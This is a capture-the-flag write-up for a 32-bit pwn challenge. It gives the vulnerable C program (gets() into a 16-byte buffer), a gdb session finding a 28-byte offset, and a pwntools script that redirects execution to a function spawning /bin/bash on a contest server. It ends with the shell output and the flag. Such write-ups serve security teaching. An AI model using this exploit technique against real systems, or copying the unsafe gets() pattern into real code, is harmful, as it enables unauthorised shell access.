+++
title = "Baby Buffer Overflow - 32bit"
description = "Can you command this program to where it cannot go?\nTo get the flag, you must somehow take control of its excecution.\nIs it even possible?"
authors = ["cstef"]
date = 2024-09-30

[taxonomies]
categories = ["pwn"]
+++

## Description

Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible?

----

We start out by inspecting the program's source code:

```c
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

First thing that comes to your mind when seeing vuln: the `return 0` line. As easy as overflowing `buf[16]` to overwrite the return address to the one from `target()`.

We craft a simple payload to get the offset: `AAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF`.
The first 16 `A`s are here to overflow the buffer, and the rest of the letters are in groups of 4 because this is typically the size of a value in the stack (4 bytes).

Running this with `gdb`, we get the following:

```
(gdb) run
Starting program: /home/cstef/baby
Gimme some data!
AAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
(gdb) info registers
eax            0x0                 0
ecx            0xffffd944          -9916
edx            0x0                 0
ebx            0xf7ffafa0          -134238304
esp            0xffffd940          0xffffd940
ebp            0x44444444          0x44444444
esi            0xffffd9d4          -9772
edi            0xf7ffafa0          -134238304
eip            0x45454545          0x45454545
eflags         0x10282             [ SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
```

The `eip` register points to `0x45454545`, which is our `E` part. Based on this, we calculate the offset:

`16*"A" + 4*"B" + 4*"C" + 4*"D" = 28`

We now need to overwrite the stack at `<vuln+28>`:

```python
from pwn import *
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <binary>")
    sys.exit(1)

elf = ELF(sys.argv[1])
target_addr = elf.symbols["target"]
log.info(f"Target address: {hex(target_addr)}")

payload = b"A" * 28 # Padding to <vuln+28>
payload += p32(target_addr) # Replace with `target()`'s address
log.info(f"Payload: {payload}")

p = remote("challenge.ctf.games", 31453)

p.recvuntil(b"Gimme some data!\n")
p.sendline(payload)
p.interactive()
```

We run it:
```
ctf ❯ python3 huntress/baby.py ./huntress/babybufov
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/Users/cstef/Documents/ctf/huntress/babybufov'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to challenge.ctf.games on port 32091: Done
[*] Target address: 0x80491f5
[*] Payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf5\x91\x04\x08'
[*] Switching to interactive mode
Jackpot!
$ ls
babybufov
babybufov.c
flag
$ cat flag
flag{4cd3b4079393e861af489ca063373f98}
```
Flagged !